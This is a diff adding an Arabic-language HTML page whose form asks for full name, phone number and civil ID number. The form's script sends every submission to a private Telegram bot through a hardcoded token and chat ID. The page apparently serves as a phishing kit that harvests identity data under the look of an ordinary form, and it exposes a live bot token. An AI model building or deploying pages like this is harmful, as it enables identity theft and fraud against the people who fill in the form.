@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة مع فورم وصور</title>
+    <link rel="stylesheet" href="logo.css">
+    <style>
+        /* تعيين ارتفاع الصفحة الكامل */
+        body, html {
+            height: 100%;
+            margin: 0;
+        }
+
+        /* استخدام flexbox لجعل الصفحة تأخذ كامل الارتفاع */
+        body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;  /* يضمن أن الصفحة تأخذ على الأقل ارتفاع الشاشة */
+        }
+
+        /* محتوى الصفحة */
+        .main-content {
+            flex-grow: 1;  /* يضمن أن المحتوى الرئيسي يملأ المساحة المتاحة */
+        }
+
+        /* الفوتر */
+        footer {
+            background-color: #0E4C8C;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            width: 100%;
+            margin-top: auto; /* هذا يضمن أن الفوتر سيظل في أسفل الصفحة */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- الهيدر -->
+    <header>
+        <img src="logo20.jpg" alt="شعار">
+    </header>
+
+    <!-- الصورة في البودي -->
+    <img class="main-image" src="bode20.png" alt="صورة رئيسية">
+
+    <!-- مسافة 50px -->
+    <div class="spacer"></div>
+
+    <!-- الفورم -->
+    <div class="form-container">
+        <h2>يرجى إدخال بياناتك</h2>
+        <form id="myForm">
+            <input type="text" id="fullName" name="fullName" placeholder="الاسم الكامل" required>
+            <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
+            <input type="text" id="civilId" name="civilId" placeholder="الرقم المدني" required>
+            <button type="submit">إرسال</button>
+        </form>
+    </div>
+
+    <!-- الفوتر -->
+    <footer>
+        <p>© 2025 جميع الحقوق محفوظة</p>
+    </footer>
+
+    <!-- JavaScript لإرسال البيانات -->
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // منع الإرسال الافتراضي
+
+            var fullName = document.getElementById("fullName").value;
+            var phoneNumber = document.getElementById("phoneNumber").value;
+            var civilId = document.getElementById("civilId").value;
+
+            var telegramToken = "7629817492:AAGhTCC0mJj8AS_Ng0OFJmqp9Jm5Gcy8MdY"; // استبدل بتوكن البوت الخاص بك
+            var chatId = "7595871538"; // استبدل بـ Chat ID الخاص بك
+
+            var message = `📩 بيانات جديدة:\n\n` +
+                          `👤 الاسم: ${fullName}\n` +
+                          `📞 الهاتف: ${phoneNumber}\n` +
+                          `🆔 الرقم المدني: ${civilId}`;
+
+            var url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "form.html"; // الانتقال إلى صفحة نجاح بعد الإرسال
+                } else {
+                    alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+                }
+            })
+            .catch(error => {
+                console.log("حدث خطأ في الاتصال:", error);
+                alert("تعذر إرسال البيانات.");
+            });
+        });
+    </script>
+
+</body>
+</html>
